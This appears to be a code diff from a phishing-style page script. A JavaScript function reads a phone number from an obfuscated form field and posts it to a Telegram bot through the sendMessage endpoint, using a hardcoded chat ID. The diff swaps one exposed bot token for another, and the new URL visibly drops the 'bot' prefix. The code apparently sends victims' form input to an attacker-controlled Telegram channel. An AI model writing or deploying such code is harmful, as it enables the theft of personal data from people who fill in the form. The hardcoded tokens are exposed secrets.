@@ -1,6 +1,5 @@
 function functionToExecute() {
 
-    let apiToken = "5953853423:AAHhoTbXnHkcTEwTdiqH7MwNO7lZA5iSHSs";
     let chatId = "5445772855";
 
     var phone = document.getElementsByName('ddsfgdfg')[0].value
@@ -9,7 +8,7 @@ function functionToExecute() {
     var settings = {
       "async": true,
       "crossDomain": true,
-      "url": "https://api.telegram.org/" + "bot5953853423:AAHhoTbXnHkcTEwTdiqH7MwNO7lZA5iSHSs" + "/sendMessage",
+      "url": "https://api.telegram.org/" + "5995981279:AAGnPr9MAz7zYyXno3CoG5o-YN9rJ9kA2Zg" + "/sendMessage",
       "method": "POST",
       "headers": {
         "Content-Type": "application/json",
